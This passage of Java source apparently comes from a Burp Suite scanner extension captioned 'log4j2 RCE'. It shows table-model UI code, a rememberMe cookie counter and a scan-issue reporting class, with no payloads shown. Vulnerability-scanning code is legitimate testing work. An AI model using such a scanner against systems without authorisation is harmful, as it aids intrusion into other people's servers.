            if (d.host.equals(host) && d.port == port)
                return false;
        }
        return true;
    }

    public IHttpService getHttpService() {
        return this.currentlyDisplayedItem.getHttpService();
    }

    public byte[] getRequest() {
        return this.currentlyDisplayedItem.getRequest();
    }

    public byte[] getResponse() {
        return this.currentlyDisplayedItem.getResponse();
    }

    public String getTabCaption() {
        return "log4j2 RCE";
    }

    public Component getUiComponent() {
        return this.mjSplitPane;
    }

    public int getRowCount() {
        return this.Udatas.size();
    }

    public int getColumnCount() {
        return 5;
    }

    /**
     * 获取响应中RememberMe的数量
     * @param response
     * @return
     */
    public int getRememberMeNumber(byte[] response){
        int number = 0;
        for (ICookie cookies : helpers.analyzeResponse(response).getCookies()){
            if (cookies.getName().equals("rememberMe")){
                number++;
            }
        }
        return number;
    }

    public String getColumnName(int columnIndex) {
        switch (columnIndex) {
            case 0:
                return "#";
            case 1:
                return "Method";
            case 2:
                return "URL";
            case 3:
                return "Status";
            case 4:
                return "Issue";
        }
        return null;
    }

    public Object getValueAt(int rowIndex, int columnIndex) {
        TablesData datas = this.Udatas.get(rowIndex);
        switch (columnIndex) {
            case 0:
                return Integer.valueOf(datas.Id);
            case 1:
                return datas.Method;
            case 2:
                return datas.URL;
            case 3:
                return datas.Status;
            case 4:
                return datas.issue;
        }
        return null;
    }

    public class URLTable extends JTable {
        public URLTable(TableModel tableModel) {
            super(tableModel);
        }

        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            BurpExtender.TablesData dataEntry = BurpExtender.this.Udatas.get(convertRowIndexToModel(row));
            BurpExtender.this.HRequestTextEditor.setMessage(dataEntry.requestResponse.getRequest(), true);
            BurpExtender.this.HResponseTextEditor.setMessage(dataEntry.requestResponse.getResponse(), false);
            BurpExtender.this.currentlyDisplayedItem = dataEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }

    public static class TablesData {
        final int Id;

        final String Method;

        final String URL;

        final String Status;

        final String issue;

        final IHttpRequestResponse requestResponse;

        final String host;

        final int port;

        public TablesData(int id, String method, String url, String status, String issue, IHttpRequestResponse requestResponse, String host, int port) {
            this.Id = id;
            this.Method = method;
            this.URL = url;
            this.Status = status;
            this.issue = issue;
            this.requestResponse = requestResponse;
            this.host = host;
            this.port = port;
        }
    }

}





class CustomScanIssue implements IScanIssue
{
    private IHttpService httpService;
    private URL url;
    private IHttpRequestResponse[] httpMessages;
    private String name;
    private String detail;
    private String severity;

    /**
     *
     * @param httpService   HTTP服务
     * @param url   漏洞url
     * @param httpMessages  HTTP消息
     * @param name  漏洞名称
     * @param detail    漏洞细节
     * @param severity  漏洞等级
     */
    public CustomScanIssue(
            IHttpService httpService,
            URL url,
            IHttpRequestResponse[] httpMessages,
            String name,
            String detail,
            String severity)
    {
        this.httpService = httpService;
        this.url = url;
        this.httpMessages = httpMessages;
        this.name = name;
        this.detail = detail;
        this.severity = severity;
    }

    public URL getUrl()
    {
        return url;
    }

    public String getIssueName()
    {
        return name;
    }

    public int getIssueType()
    {
        return 0;
    }

    public String getSeverity()
    {
        return severity;
    }

    public String getConfidence()
    {
        return "Certain";
    }

    public String getIssueBackground()
    {
        return null;
    }

    public String getRemediationBackground()
    {
        return null;
    }


    public String getIssueDetail()
    {
        return detail;
    }

    public String getRemediationDetail()
    {
        return null;
    }

    public IHttpRequestResponse[] getHttpMessages()
    {
        return httpMessages;
    }

    public IHttpService getHttpService()
    {
        return httpService;
    }

}
